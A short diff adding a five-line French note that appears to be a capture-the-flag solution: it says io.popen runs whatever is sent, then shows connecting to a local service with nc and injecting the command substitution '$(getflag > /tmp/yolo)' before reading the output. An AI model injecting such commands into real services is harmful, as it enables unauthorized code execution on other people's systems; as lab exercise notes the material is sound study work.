@@ -1,0 +1,5 @@
+io.popen execute le code qu'on lui envoi
+nc localhost 5151
+$(getflag > /tmp/yolo)
+cat yolo
+:)
